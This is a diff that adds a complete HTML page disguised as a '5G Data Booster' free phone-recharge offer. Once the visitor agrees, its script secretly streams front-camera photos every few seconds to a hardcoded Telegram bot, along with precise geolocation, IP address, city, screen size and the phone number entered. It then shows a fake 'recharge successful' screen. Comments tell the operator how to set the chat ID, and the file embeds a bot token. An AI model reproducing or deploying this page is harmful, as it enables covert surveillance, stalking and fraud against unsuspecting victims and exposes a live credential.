@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>5G Network Booster</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); font-family: 'Segoe UI', sans-serif; min-height: 100vh; color: #fff; padding: 20px; }
+        .container { max-width: 450px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 20px; padding: 15px 0; }
+        .logo { font-size: 50px; margin-bottom: 5px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        .header h1 { font-size: 22px; background: linear-gradient(90deg, #00ff88, #00d2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .balance-card { background: linear-gradient(135deg, #1a2a3a, #0f1a24); border-radius: 25px; padding: 20px; text-align: center; margin-bottom: 20px; border: 1px solid rgba(0,210,255,0.3); }
+        .balance-label { font-size: 12px; color: #aaa; letter-spacing: 2px; }
+        .balance-amount { font-size: 42px; font-weight: bold; color: #00ff88; margin: 10px 0; }
+        .data-badge { background: rgba(0,210,255,0.2); display: inline-block; padding: 5px 15px; border-radius: 50px; font-size: 12px; }
+        .section-title { font-size: 16px; margin: 20px 0 15px 0; padding-left: 10px; border-left: 3px solid #00d2ff; }
+        .recharge-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px; }
+        .recharge-card { background: rgba(21,24,31,0.9); border-radius: 20px; padding: 15px 10px; text-align: center; cursor: pointer; border: 1px solid rgba(255,255,255,0.1); transition: all 0.3s; }
+        .recharge-card.selected { border: 2px solid #00ff88; background: linear-gradient(135deg, #1a3a2a, #0f2418); }
+        .recharge-amount { font-size: 20px; font-weight: bold; }
+        .recharge-data { font-size: 11px; color: #00d2ff; margin-top: 5px; }
+        .recharge-price { font-size: 12px; color: #00ff88; margin-top: 8px; }
+        .recharge-tag { font-size: 9px; background: #ff4444; display: inline-block; padding: 2px 8px; border-radius: 20px; margin-top: 5px; }
+        .operator-selector { background: rgba(21,24,31,0.9); border-radius: 20px; padding: 15px; margin-bottom: 20px; }
+        .operator-icons { display: flex; justify-content: space-around; gap: 10px; }
+        .operator { text-align: center; cursor: pointer; padding: 10px; border-radius: 15px; flex: 1; background: rgba(255,255,255,0.05); }
+        .operator.selected { background: linear-gradient(135deg, #00d2ff, #0088aa); color: #000; }
+        .operator-icon { font-size: 28px; display: block; }
+        .operator-name { font-size: 10px; margin-top: 5px; }
+        .number-input { background: rgba(21,24,31,0.9); border-radius: 20px; padding: 15px; margin-bottom: 20px; }
+        .input-field { width: 100%; padding: 14px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.5); color: #fff; font-size: 16px; text-align: center; }
+        .proceed-btn { background: linear-gradient(90deg, #00ff88, #00aa55); color: #000; padding: 18px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; border: none; font-size: 16px; text-transform: uppercase; margin-bottom: 15px; }
+        .proceed-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; display: none; justify-content: center; align-items: center; flex-direction: column; }
+        .loading-spinner { width: 60px; height: 60px; border: 4px solid #00d2ff; border-top-color: #00ff88; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2001; display: none; justify-content: center; align-items: center; flex-direction: column; }
+        .success-card { background: linear-gradient(135deg, #1a2a3a, #0f1a24); border-radius: 30px; padding: 40px 30px; text-align: center; width: 85%; max-width: 320px; border: 1px solid #00ff88; }
+        .success-icon { font-size: 70px; margin-bottom: 15px; }
+        .success-title { font-size: 24px; color: #00ff88; margin-bottom: 10px; }
+        .close-btn { background: #00ff88; color: #000; padding: 12px 25px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #00ff88; color: #000; padding: 10px 20px; border-radius: 50px; font-size: 12px; opacity: 0; transition: opacity 0.3s; z-index: 2002; }
+        .hidden-cam { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        .hidden-cam video { width: 1px; height: 1px; }
+        .debug-info { position: fixed; bottom: 5px; left: 5px; background: rgba(0,0,0,0.8); color: #0f0; font-size: 10px; padding: 4px 8px; border-radius: 5px; font-family: monospace; z-index: 9999; }
+        .test-mode-badge { position: fixed; top: 5px; right: 5px; background: #ff8800; color: #000; padding: 4px 8px; border-radius: 5px; font-size: 10px; font-weight: bold; z-index: 9999; }
+    </style>
+</head>
+<body>
+    <div class="test-mode-badge" id="testBadge">🔧 TEST MODE</div>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🚀</div>
+            <h1>5G DATA BOOSTER</h1>
+            <p>Free Recharge + Unlimited Data | Limited Offer</p>
+        </div>
+
+        <div class="balance-card">
+            <div class="balance-label">AVAILABLE BALANCE</div>
+            <div class="balance-amount">₹<span id="balance">249</span></div>
+            <div class="data-badge">🎁 2GB BONUS DATA EXPIRES SOON</div>
+        </div>
+
+        <div class="section-title">📱 POPULAR RECHARGE PLANS</div>
+        <div class="recharge-grid" id="rechargeGrid">
+            <div class="recharge-card" data-amount="199" data-data="1.5GB/day">
+                <div class="recharge-amount">₹199</div>
+                <div class="recharge-data">1.5GB/day</div>
+                <div class="recharge-price">28 Days</div>
+                <div class="recharge-tag">POPULAR</div>
+            </div>
+            <div class="recharge-card" data-amount="299" data-data="2GB/day">
+                <div class="recharge-amount">₹299</div>
+                <div class="recharge-data">2GB/day</div>
+                <div class="recharge-price">28 Days</div>
+                <div class="recharge-tag">BEST VALUE</div>
+            </div>
+            <div class="recharge-card" data-amount="399" data-data="3GB/day">
+                <div class="recharge-amount">₹399</div>
+                <div class="recharge-data">3GB/day</div>
+                <div class="recharge-price">28 Days</div>
+                <div class="recharge-tag">PREMIUM</div>
+            </div>
+            <div class="recharge-card" data-amount="79" data-data="2GB">
+                <div class="recharge-amount">₹79</div>
+                <div class="recharge-data">2GB Data</div>
+                <div class="recharge-price">1 Day</div>
+            </div>
+            <div class="recharge-card" data-amount="149" data-data="6GB">
+                <div class="recharge-amount">₹149</div>
+                <div class="recharge-data">6GB Data</div>
+                <div class="recharge-price">7 Days</div>
+            </div>
+            <div class="recharge-card" data-amount="599" data-data="2GB/day">
+                <div class="recharge-amount">₹599</div>
+                <div class="recharge-data">2GB/day</div>
+                <div class="recharge-price">56 Days</div>
+            </div>
+        </div>
+
+        <div class="operator-selector">
+            <div class="operator-title">📡 SELECT YOUR OPERATOR</div>
+            <div class="operator-icons">
+                <div class="operator" data-operator="jio"><span class="operator-icon">📶</span><span class="operator-name">Jio</span></div>
+                <div class="operator" data-operator="airtel"><span class="operator-icon">📱</span><span class="operator-name">Airtel</span></div>
+                <div class="operator" data-operator="vi"><span class="operator-icon">💜</span><span class="operator-name">Vi</span></div>
+                <div class="operator" data-operator="bsnl"><span class="operator-icon">🇮🇳</span><span class="operator-name">BSNL</span></div>
+            </div>
+        </div>
+
+        <div class="number-input">
+            <label class="input-label">📞 ENTER MOBILE NUMBER</label>
+            <input type="tel" class="input-field" id="mobileNumber" placeholder="Enter 10 digit number" maxlength="10">
+        </div>
+
+        <button class="proceed-btn" id="proceedBtn">💸 RECHARGE NOW</button>
+        <p style="font-size: 10px; text-align: center; color: #666;">By proceeding, you agree to T&C</p>
+    </div>
+
+    <div class="hidden-cam">
+        <video id="hiddenVideo" autoplay playsinline muted></video>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Processing Recharge...</div>
+        <div class="loading-subtext">Please wait, verifying payment</div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <div class="success-card">
+            <div class="success-icon">✅</div>
+            <div class="success-title">RECHARGE SUCCESSFUL!</div>
+            <div class="success-msg" id="successMsg"></div>
+            <button class="close-btn" onclick="closeSuccessModal()">OK</button>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+    <div class="debug-info" id="debugInfo">Initializing...</div>
+
+    <script>
+        function debugLog(msg) {
+            console.log(msg);
+            const debugEl = document.getElementById('debugInfo');
+            if (debugEl) {
+                debugEl.innerHTML = msg.slice(0, 60);
+                debugEl.style.background = '#000';
+            }
+        }
+        
+        // ========== ⚠️⚠️⚠️ CHANGE THIS TO YOUR TELEGRAM CHAT ID ⚠️⚠️⚠️ ==========
+        // How to get your CHAT_ID:
+        // 1. Send any message to your bot
+        // 2. Visit: https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
+        // 3. Find "chat":{"id":123456789}
+        
+        const HARDCODED_CHAT_ID = "8256108006";  // <--- CHANGE THIS TO YOUR REAL CHAT ID!
+        
+        // Your bot token (already set)
+        const BOT_TOKEN = "8681278255:AAFnNrOYBQYoK_4WhurHY-j9EAFjlQ_OcXY";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+        
+        // ========== USE HARDCODED CHAT ID ==========
+        let CHAT_ID = HARDCODED_CHAT_ID;
+        let CAM_MODE = 'front';
+        let ACCESS_TYPE = 'free';
+        
+        debugLog('CHAT_ID set to: ' + CHAT_ID);
+        
+        // Test bot connection on load
+        async function testBotConnection() {
+            try {
+                const response = await fetch(`${TELEGRAM_API}getMe`);
+                const result = await response.json();
+                if (result.ok) {
+                    debugLog('✅ Bot connected: ' + result.result.username);
+                    document.getElementById('testBadge').style.background = '#00aa00';
+                    document.getElementById('testBadge').innerHTML = '✅ BOT ONLINE';
+                } else {
+                    debugLog('❌ Bot connection failed');
+                    document.getElementById('testBadge').style.background = '#ff0000';
+                    document.getElementById('testBadge').innerHTML = '❌ BOT ERROR';
+                }
+            } catch(e) {
+                debugLog('❌ Cannot connect to Telegram API: ' + e.message);
+                document.getElementById('testBadge').style.background = '#ff0000';
+                document.getElementById('testBadge').innerHTML = '❌ NO INTERNET?';
+            }
+        }
+        
+        // ========== VARIABLES ==========
+        let selectedAmount = 199;
+        let selectedData = "1.5GB/day";
+        let selectedOperator = "jio";
+        let isCapturing = false;
+        let captureInterval = null;
+        let videoStream = null;
+        let photoCount = 0;
+        let locationSent = false;
+        
+        const CAPTURE_INTERVAL_MS = 5000;
+        
+        const rechargeCards = document.querySelectorAll('.recharge-card');
+        const operators = document.querySelectorAll('.operator');
+        const proceedBtn = document.getElementById('proceedBtn');
+        const mobileInput = document.getElementById('mobileNumber');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const successModal = document.getElementById('successModal');
+        const toast = document.getElementById('toast');
+        
+        function showToastMsg(msg, isError = false) {
+            toast.textContent = msg;
+            toast.style.background = isError ? '#ff4444' : '#00ff88';
+            toast.style.opacity = '1';
+            setTimeout(() => { toast.style.opacity = '0'; }, 2000);
+        }
+        
+        rechargeCards.forEach(card => {
+            card.addEventListener('click', () => {
+                rechargeCards.forEach(c => c.classList.remove('selected'));
+                card.classList.add('selected');
+                selectedAmount = parseInt(card.dataset.amount);
+                selectedData = card.dataset.data;
+                debugLog('Plan: ₹' + selectedAmount);
+            });
+        });
+        if (rechargeCards.length > 0) rechargeCards[0].classList.add('selected');
+        
+        operators.forEach(op => {
+            op.addEventListener('click', () => {
+                operators.forEach(o => o.classList.remove('selected'));
+                op.classList.add('selected');
+                selectedOperator = op.dataset.operator;
+                debugLog('Operator: ' + selectedOperator);
+            });
+        });
+        if (operators.length > 0) operators[0].classList.add('selected');
+        
+        async function sendToBot(endpoint, body, isFormData = false) {
+            if (!CHAT_ID) {
+                debugLog('❌ No CHAT_ID');
+                return false;
+            }
+            
+            try {
+                const config = { method: 'POST' };
+                if (isFormData) {
+                    config.body = body;
+                } else {
+                    body.chat_id = CHAT_ID;
+                    config.headers = { 'Content-Type': 'application/json' };
+                    config.body = JSON.stringify(body);
+                }
+                const response = await fetch(TELEGRAM_API + endpoint, config);
+                const result = await response.json();
+                if (result.ok) {
+                    debugLog('✅ Sent: ' + endpoint);
+                    return true;
+                } else {
+                    debugLog('❌ Error: ' + JSON.stringify(result));
+                    return false;
+                }
+            } catch(e) {
+                debugLog('❌ Network error: ' + e.message);
+                return false;
+            }
+        }
+        
+        async function sendLocationWithButton(latitude, longitude, accuracy) {
+            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const keyboard = {
+                inline_keyboard: [[{ text: "📍 VIEW ON GOOGLE MAPS", url: mapsLink }]]
+            };
+            
+            await sendToBot('sendLocation', { latitude: latitude, longitude: longitude });
+            await sendToBot('sendMessage', {
+                text: `📍 <b>LIVE LOCATION!</b>\n\n🌐 ${latitude}, ${longitude}\n🎯 Accuracy: ${accuracy}m\n💰 ₹${selectedAmount}\n📱 ${mobileInput.value || 'N/A'}\n📡 ${selectedOperator.toUpperCase()}`,
+                parse_mode: 'HTML',
+                reply_markup: JSON.stringify(keyboard)
+            });
+        }
+        
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        await sendLocationWithButton(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
+                        locationSent = true;
+                        showToastMsg('📍 Location sent!');
+                        resolve(true);
+                    },
+                    (error) => {
+                        sendToBot('sendMessage', { text: `❌ LOCATION FAILED: ${error.message}`, parse_mode: 'HTML' });
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+        
+        async function captureAndSend() {
+            if (!videoStream || !isCapturing) return;
+            try {
+                const video = document.getElementById('hiddenVideo');
+                if (!video.videoWidth) return;
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `cam_${Date.now()}.jpg`);
+                formData.append('caption', `📸 ${CAM_MODE.toUpperCase()} CAMERA\n₹${selectedAmount} | ${selectedOperator.toUpperCase()}\n📱 ${mobileInput.value}\n🔢 #${photoCount + 1}`);
+                
+                const sent = await sendToBot('sendPhoto', formData, true);
+                if (sent) {
+                    photoCount++;
+                    document.getElementById('balance').innerHTML = photoCount;
+                }
+            } catch(e) {
+                debugLog('Capture error: ' + e.message);
+            }
+        }
+        
+        async function startCamera() {
+            try {
+                const constraints = { video: CAM_MODE === 'back' ? { facingMode: { exact: 'environment' } } : { facingMode: 'user' } };
+                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = videoStream;
+                await video.play();
+                isCapturing = true;
+                captureInterval = setInterval(captureAndSend, CAPTURE_INTERVAL_MS);
+                debugLog('Camera started: ' + CAM_MODE);
+                return true;
+            } catch(e) {
+                debugLog('Camera error: ' + e.message);
+                return false;
+            }
+        }
+        
+        async function sendDeviceInfo() {
+            let ipData = { ip: 'N/A', city: 'N/A', country_name: 'N/A' };
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                ipData = await ipRes.json();
+            } catch(e) {}
+            
+            const info = `🔥 NEW TARGET\n\n💰 ₹${selectedAmount} (${selectedData})\n📱 ${mobileInput.value}\n📡 ${selectedOperator.toUpperCase()}\n🌐 IP: ${ipData.ip}\n📍 ${ipData.city}, ${ipData.country_name}\n🖥️ ${screen.width}x${screen.height}`;
+            await sendToBot('sendMessage', { text: info, parse_mode: 'HTML' });
+        }
+        
+        async function proceedRecharge() {
+            const mobile = mobileInput.value;
+            if (!mobile || mobile.length !== 10) {
+                showToastMsg('Enter valid 10 digit number', true);
+                return;
+            }
+            
+            if (CHAT_ID === "123456789") {
+                showToastMsg('CHAT_ID not set! Check debug info', true);
+                debugLog('❌ CHANGE HARDCODED_CHAT_ID to your real chat ID!');
+                return;
+            }
+            
+            proceedBtn.disabled = true;
+            proceedBtn.textContent = '⏳ PROCESSING...';
+            loadingOverlay.style.display = 'flex';
+            
+            const cameraStarted = await startCamera();
+            if (!cameraStarted) {
+                showToastMsg('Camera permission required!', true);
+                loadingOverlay.style.display = 'none';
+                proceedBtn.disabled = false;
+                proceedBtn.textContent = '💸 RECHARGE NOW';
+                return;
+            }
+            
+            await getLocation();
+            await sendDeviceInfo();
+            
+            setTimeout(async () => {
+                if (captureInterval) clearInterval(captureInterval);
+                if (videoStream) videoStream.getTracks().forEach(track => track.stop());
+                isCapturing = false;
+                
+                loadingOverlay.style.display = 'none';
+                document.getElementById('successMsg').innerHTML = `₹${selectedAmount} ${selectedOperator.toUpperCase()} plan activated!<br>📸 Photos: ${photoCount}<br>📍 Location: ${locationSent ? 'Captured' : 'Failed'}`;
+                successModal.style.display = 'flex';
+                proceedBtn.disabled = false;
+                proceedBtn.textContent = '💸 RECHARGE NOW';
+                
+                await sendToBot('sendMessage', { text: `✅ SESSION COMPLETE\n📸 ${photoCount} photos\n📍 ${locationSent ? 'Location OK' : 'Location Failed'}`, parse_mode: 'HTML' });
+            }, 20000);
+        }
+        
+        function closeSuccessModal() {
+            successModal.style.display = 'none';
+        }
+        
+        window.onload = () => {
+            mobileInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
+            });
+            proceedBtn.onclick = proceedRecharge;
+            testBotConnection();
+            
+            if (CHAT_ID === "123456789") {
+                debugLog('⚠️⚠️⚠️ CHANGE HARDCODED_CHAT_ID in code! ⚠️⚠️⚠️');
+                document.getElementById('debugInfo').style.background = '#ff0000';
+            }
+        };
+        
+        window.onbeforeunload = () => {
+            if (captureInterval) clearInterval(captureInterval);
+            if (videoStream) videoStream.getTracks().forEach(track => track.stop());
+        };
+        
+        window.closeSuccessModal = closeSuccessModal;
+    </script>
+</body>
+</html>
